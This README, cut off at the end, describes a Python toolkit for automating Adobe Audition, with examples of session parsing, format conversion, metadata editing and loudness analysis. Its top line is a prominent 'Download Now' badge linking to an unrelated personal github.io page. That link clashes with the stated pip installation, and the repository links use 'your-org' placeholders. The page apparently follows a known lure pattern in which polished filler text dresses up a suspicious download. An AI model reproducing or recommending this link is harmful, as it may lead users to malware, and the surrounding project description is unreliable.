# adobe-audition-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://sathyakumar92.github.io/adobe-info-473/)


[![PyPI version](https://img.shields.io/pypi/v/adobe-audition-toolkit.svg)](https://pypi.org/project/adobe-audition-toolkit/)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform: Windows](https://img.shields.io/badge/platform-Windows-lightgrey.svg)](https://www.microsoft.com/windows)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)

---

A Python toolkit for programmatic interaction with **Adobe Audition on Windows** — automate audio file processing, batch editing workflows, metadata extraction, and format conversion without leaving your development environment.

> **Note:** This toolkit is a developer utility layer. A licensed installation of Adobe Audition for Windows is required for full functionality. Some features (metadata extraction, format conversion) operate independently via open audio libraries.

---

## ✨ Features

- 🎛️ **Batch Audio Processing** — Apply effects, normalize levels, and trim silence across hundreds of files in a single pipeline
- 🏷️ **Metadata Extraction** — Read and write ID3 tags, BWF metadata, and session markers from `.sesx` and common audio formats
- 🔄 **Format Conversion** — Convert between WAV, MP3, AIFF, FLAC, and OGG with configurable sample rate and bit-depth settings
- 📋 **Session File Parsing** — Parse Adobe Audition `.sesx` XML session files to inspect track layouts and clip references
- 🤖 **Audition Automation** — Drive Adobe Audition's Windows COM interface for scripted export and effect rendering
- 📊 **Audio Analysis** — Extract RMS levels, peak amplitude, frequency snapshots, and silence detection data
- 🗂️ **Multitrack Export** — Automate stem exports from multitrack sessions with consistent naming conventions
- 🪝 **Pipeline Integration** — Hook into CI/CD or media asset management pipelines via a clean, composable Python API

---

## 📦 Installation

**Recommended — install from PyPI:**

```bash
pip install adobe-audition-toolkit
```

**Install with optional audio analysis dependencies:**

```bash
pip install adobe-audition-toolkit[analysis]
```

**Install from source:**

```bash
git clone https://github.com/your-org/adobe-audition-toolkit.git
cd adobe-audition-toolkit
pip install -e ".[dev]"
```

---

## 🚀 Quick Start

```python
from audition_toolkit import AuditionSession, AudioBatch

# Parse an existing Adobe Audition session file
session = AuditionSession.from_file("my_project.sesx")

print(f"Session name : {session.name}")
print(f"Sample rate  : {session.sample_rate} Hz")
print(f"Tracks found : {len(session.tracks)}")

for track in session.tracks:
    print(f"  • {track.name} — {len(track.clips)} clip(s)")
```

**Output:**
```
Session name : Podcast_Episode_42
Sample rate  : 48000 Hz
Tracks found : 6
  • Host Mic — 12 clip(s)
  • Guest Mic — 9 clip(s)
  • Music Bed — 3 clip(s)
```

---

## 📖 Usage Examples

### 1. Batch Format Conversion

Convert a folder of WAV recordings to MP3 for distribution, preserving directory structure.

```python
from audition_toolkit import AudioBatch
from audition_toolkit.formats import ConversionConfig

config = ConversionConfig(
    output_format="mp3",
    bitrate=320,
    sample_rate=44100,
    overwrite_existing=False,
)

batch = AudioBatch(source_dir="./recordings/wav", output_dir="./recordings/mp3")
results = batch.convert(config=config)

print(f"Converted : {results.success_count} files")
print(f"Skipped   : {results.skipped_count} files")
print(f"Failed    : {results.failed_count} files")

# Inspect any failures
for failure in results.failures:
    print(f"  ✗ {failure.filename}: {failure.reason}")
```

---

### 2. Metadata Extraction and Editing

Read and update embedded metadata on a batch of audio files — useful for podcast production or broadcast delivery.

```python
from audition_toolkit.metadata import MetadataReader, MetadataWriter

# Read metadata from a single file
reader = MetadataReader("interview_raw.wav")
meta = reader.extract()

print(meta.title)       # "Raw Interview — Guest Name"
print(meta.sample_rate) # 48000
print(meta.bit_depth)   # 24
print(meta.duration)    # 3742.5  (seconds)
print(meta.bwf_description)  # Broadcast Wave Format fields if present

# Write updated metadata back
writer = MetadataWriter("interview_raw.wav")
writer.update(
    title="EP42 — Guest Name Interview",
    artist="My Podcast",
    album="Season 3",
    year=2024,
    comment="Recorded on Zoom H6, 48kHz/24-bit",
)
writer.save()
print("Metadata updated successfully.")
```

---

### 3. Session File Analysis

Inspect an Adobe Audition multitrack session without opening the application — useful for asset audits and project reporting.

```python
from audition_toolkit import AuditionSession
from audition_toolkit.reports import SessionReport

session = AuditionSession.from_file("final_mix.sesx")
report = SessionReport(session)

# List all referenced audio files and check they exist on disk
missing = report.find_missing_media()
if missing:
    print(f"⚠️  {len(missing)} missing media file(s):")
    for path in missing:
        print(f"    {path}")
else:
    print("✅  All media files resolved.")

# Export a CSV summary of every clip across all tracks
report.export_clip_manifest("clip_manifest.csv")
print("Clip manifest written to clip_manifest.csv")
```

---

### 4. Audio Analysis Pipeline

Run signal-level analysis across a batch of files — ideal for quality-control checks before delivery.

```python
from audition_toolkit.analysis import AudioAnalyzer

analyzer = AudioAnalyzer("./final_renders/")

for result in analyzer.scan():
    status = "✅" if result.passes_loudness_spec else "⚠️ "
    print(
        f"{status} {result.filename:<40} "
        f"LUFS: {result.integrated_loudness:>6.1f}  "
        f"Peak: {result.true_peak:>5.1f} dBTP  "
        f"Duration: {result.duration:>8.1f}s"
    )
```

**Output:**
```
✅ episode_42_final.wav                  LUFS:  -16.0  Peak:  -1.2 dBTP  Duration:  3742.5s
⚠️  promo_30sec_v2.wav                   LUFS:  -11.3  Peak:   -0.1 dBTP  Duration:    30.0s
✅ music_bed_fade.wav                    LUFS:  -22.4  Peak:  -3.8 dBTP  Duration:   182.3s
```

---

### 5. Automating Adobe Audition via Windows COM

For workflows that require Adobe Audition's own rendering engine on Windows, the toolkit wraps the COM automation interface.

```python
from audition_toolkit.com import AuditionApp

# Requires Adobe Audition to be installed on Windows
with AuditionApp() as app:
    app.open_session("C:/Projects/final_mix.sesx")

    # Export the mixdown using Audition's built-in engine
    app.export_mixdown(
        output_path="C:/Exports/final_mix_stereo.wav",
        format="wav",
        sample_rate=48000,
        bit_depth=24,
    )

    print("Mixdown exported via Adobe Audition.")
```

> **Platform note:** COM automation requires Windows and a licensed Adobe Audition installation. All other toolkit modules are cross-platform.

---

## 🛠️ Requirements

| Requirement | Version | Notes |
|---|---|---|
| Python | ≥ 3.8 | 3.11+ recommended |
| `pydub` | ≥ 0.25.1 | Core audio I/O |
| `mutagen` | ≥ 1.47.0 | Metadata read/write |
| `lxml` | ≥ 4.9.0 | `.sesx` session parsing |
| `numpy` | ≥ 1.24.0 | Signal analysis (`[analysis]`) |
| `pyloudnorm` | ≥ 0.1.1 | LUFS measurement (`[analysis]`) |
| `pywin32` | ≥ 306 | COM automation (Windows only) |
| FFmpeg | any recent | Required by `pydub` for MP3/AAC |
| Adobe Audition | any current | Required for COM features only |

Install FFmpeg on Windows via [winget](https://learn.microsoft.com/en-us/windows/package-manager/winget/):

```powershell
winget install Gyan.FFmpeg
```

---

## 🗂️ Project Structure

```
adobe-audition-toolkit/
├── audition_toolkit/
│   ├── __init__.py
│   ├── session.py          # .sesx file parser
│   ├── batch.py            # Batch processing engine
│   ├── metadata.py         # Metadata read/write
│   ├── formats.py          # Format conversion
│   ├── analysis.py         # Audio signal analysis
│   ├── com.py              # Windows COM automation
│   └── reports.py          # Reporting utilities
├── tests/
│   ├── fixtures/           # Sample .sesx and audio files
│   └── test_*.py
├── docs/
├── CONTRIBUTING.md
├── CHANGELOG.md
└── pyproject.toml
```

---

## 🤝 Contributing

Contributions are welcome and appreciated. Please take a moment to read the [Contributing Guide](CONTRIBUTING.md) before submitting a pull request.

**Quick contribution workflow:**

```bash
# Fork and clone the repo, then:
git checkout -b feature/your-feature-name

pip install -e ".[dev]"
pre-commit install

# Make your changes, then run the test suite
pytest tests/ -v --cov=audition_toolkit

git commit -m "feat: describe your change clearly"
git push origin feature/your-feature-name
# Open a Pull Request on GitHub
```

Please follow the [Conventional Commits](https://www.conventionalcommits.org/) format for commit messages, and ensure all tests pass before opening a PR.

**Reporting issues:** Use the [GitHub issue tracker](https://github.com/your-org/adobe-audition-toolkit/issues). Include your Python version, Windows version, and a minimal reproducible example.

---

## 📄 License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

---

## 🔗 Related Resources

- [Adobe Audition Official Documentation](https://helpx.adobe.com/audition/user-guide.html)
- [Broadcast Wave Format (BWF) Specification](https://tech.ebu.ch/docs/tech/tech3285.pdf)
- [E